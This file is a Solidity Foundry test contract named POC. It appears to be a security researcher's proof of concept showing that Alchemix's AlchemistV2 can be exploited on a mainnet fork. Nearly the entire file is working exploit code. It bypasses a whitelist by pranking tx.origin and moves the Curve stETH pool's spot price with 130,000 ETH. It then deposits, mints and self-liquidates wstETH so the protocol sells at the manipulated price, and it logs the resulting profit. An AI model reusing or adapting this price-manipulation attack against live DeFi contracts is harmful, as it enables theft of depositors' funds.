pragma solidity 0.8.13;

import "forge-std/Test.sol";

import {AlchemistV2} from "../AlchemistV2.sol";

interface IAlchemistV2 {
    function deposit(address token, uint256 amount, address recipient) external;
    function mint(uint256 amount, address recipient) external;
    function liquidate(address token, uint256 shares, uint256 minimumAmountOut) external;
    function accounts(address owner) external view returns (int256 debt, address[] memory depositedTokens);
    function positions(address owner, address yieldToken) external view returns (uint256 shares, uint256 lastAccruedWeight);
    function convertSharesToUnderlyingTokens(address yieldToken, uint256 shares) external view returns (uint256);
    function setYieldTokenEnabled(address token, bool enabled) external;
    function setUnderlyingTokenEnabled(address token, bool enabled) external;
    function setMaximumExpectedValue(address token, uint256 value) external;
}

interface IalETH {
    function pauseAlchemist(address addy, bool pause) external;
}

interface IProxyAdmin {
    function upgrade(address proxy, address implementation) external;
}

interface ICurvePool {
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external payable;
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IWstETH is IERC20 {
    function getStETHByWstETH(uint256 _wstETHAmount) external view returns (uint256);
    function stEthPerToken() external view returns (uint256);
}

contract POC is Test {
    function test_execute() external {
        (
            IERC20 alchemic_ethereum,
            IERC20 staked_ethereum,
            IERC20 wrapped_staked_ethereum
        ) = (
            IERC20(0x0100546F2cD4C9D97f798fFC9755E47865FF7Ee6), // alETH
            IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84), // stETH
            IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0)  // wstETH
        );

        (
            IAlchemistV2 alchemist,
            ICurvePool pool
        ) = (
            IAlchemistV2(0x062Bf725dC4cDF947aa79Ca2aaCCD4F385b13b5c),
            ICurvePool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022)
        );

        AlchemistV2 newAlchemist = new AlchemistV2();
        vm.prank(0x9e2b6378ee8ad2A4A95Fe481d63CAba8FB0EBBF9);
        IProxyAdmin(0xE0fC5CB7665041CdA26969A2D1ceb5cD5046347d).upgrade(0x062Bf725dC4cDF947aa79Ca2aaCCD4F385b13b5c, address(newAlchemist));

        vm.startPrank(0x9e2b6378ee8ad2A4A95Fe481d63CAba8FB0EBBF9);
        alchemist.setYieldTokenEnabled(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0, true);
        alchemist.setUnderlyingTokenEnabled(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, true);
        alchemist.setMaximumExpectedValue(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0, 3000000000000000000000000);
        vm.stopPrank();

        vm.prank(0xf4B5b84b8f39bC556ed230FA91A0A89Bb5E8559b);
        IalETH(0x0100546F2cD4C9D97f798fFC9755E47865FF7Ee6).pauseAlchemist(0x062Bf725dC4cDF947aa79Ca2aaCCD4F385b13b5c, false);

        uint256 starting_ethereum_amount = 130000e18;
        uint256 starting_wrapped_staked_ethereum_amount = 2687e18;
        uint256 mint_amount = 1532e18;

        deal(address(this), starting_ethereum_amount);
        address(staked_ethereum).call{value: starting_ethereum_amount}("");

        staked_ethereum.approve(address(pool), type(uint256).max);

        // NOTE(ainmox): Manipulate the balance of such that the pool will give less ethereum out.
        uint256 balance_start = address(this).balance;
        pool.exchange(1, 0, starting_ethereum_amount, 0);
        uint256 received_out = address(this).balance - balance_start;

        deal(address(wrapped_staked_ethereum), tx.origin, starting_wrapped_staked_ethereum_amount);

        uint256 staked_ethereum_cost = IWstETH(
            address(wrapped_staked_ethereum)
        ).getStETHByWstETH(starting_wrapped_staked_ethereum_amount);

        // Pretend to be the transaction origin to get around the whitelist.
        vm.startPrank(tx.origin);
        wrapped_staked_ethereum.approve(address(alchemist), type(uint256).max);
        alchemist.deposit(address(wrapped_staked_ethereum), starting_wrapped_staked_ethereum_amount, address(tx.origin));

        alchemist.mint(mint_amount, address(this));

        alchemist.liquidate(address(wrapped_staked_ethereum), type(uint256).max, 0);
        alchemist.liquidate(address(wrapped_staked_ethereum), type(uint256).max, 0);

        vm.stopPrank();

        pool.exchange{value: received_out}(0, 1, received_out, 0);

        // NOTE(ainmox): Alright, generous assumptions that --
        // 1. alETH/ETH is equal to 1
        // 2. stETH/ETH is equal to 1
        //
        // You use 130,000 ETH to manipulate the spot price (exchange 130,000 ETH to 130,000 stETH). The Alchemist
        // will trade all of the wstETH into the pool for ETH at the bad price ensuring that the attacker gets most
        // of the wstETH they deposited back.
        //
        // They lose all of their wstETH though that they had deposited so we do not count that. The majority is
        // retained back through the forcible sell into the pool at the increased price.

        // This is the amount of stETH that we have in the contract at the end of the swaps.
        uint256 final_staked_ethereum_balance = staked_ethereum.balanceOf(address(this)) - staked_ethereum_cost + mint_amount;
        if (final_staked_ethereum_balance > starting_ethereum_amount) {
            uint256 profit = final_staked_ethereum_balance - starting_ethereum_amount;
            emit log_named_decimal_uint("profit", profit, 18);
        } else {
            uint256 loss = starting_ethereum_amount - final_staked_ethereum_balance;
            emit log_named_decimal_uint("loss", loss, 18);
        }
    }

    receive() external payable {}
}